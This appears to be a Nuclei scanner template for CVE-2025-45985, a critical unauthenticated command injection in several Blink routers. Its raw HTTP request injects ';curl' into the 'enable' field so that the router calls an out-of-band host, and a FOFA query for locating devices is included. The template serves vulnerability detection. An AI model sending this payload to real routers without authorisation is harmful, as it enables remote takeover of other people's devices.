id: CVE-2025-45985

info:
  name: Blink Router - Command Injection
  author: darses
  severity: critical
  description: |
    Blink routers BL-WR9000 V2.4.9 , BL-AC2100_AZ3 V1.0.4, BL-X10_AC8 v1.0.5 , BL-LTE300 v1.2.3, BL-F1200_AT1 v1.0.0, BL-X26_AC8 v1.2.8, BLAC450M_AE4 v4.0.0 and BL-X26_DA3 v1.2.7 were discovered to contain a command injection vulnerability via the bs_SetSSIDHide function.
  reference:
    - https://github.com/glkfc/IoT-Vulnerability/blob/main/LB-LINK/LB-LINK_enable%20Unauthorized%20command%20injection/LB-LINK_enable%20command%20injection.md
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-45985
    cwe-id: CWE-77
    epss-score: 0.234
    epss-percentile: 0.95693
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="B-LINK"
  tags: cve,cve2025,b-link,rce,router,vkev

http:
  - raw:
      - |
        POST /goform/set_hidessid_cfg HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Accept: application/json, text/javascript, */*; q=0.01
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Origin: {{RootURL}}
        Referer: {[RootURL]}/admin/more.html
        Cookie: platform=0; user=admin

        type=sethide2&enable=";curl {{interactsh-url}};"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"type":'
          - '"result":'
        condition: and

      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100bb3798cee30e89df38e821a29635bc4545c7548e957e3ef878aef3d43f59923e022100a9c6cec286ef72d7bd2eb7c8e321b9352e2810e6aa83138a4b90ec803c3ef9ad:922c64590222798bb761d5b6d8e72950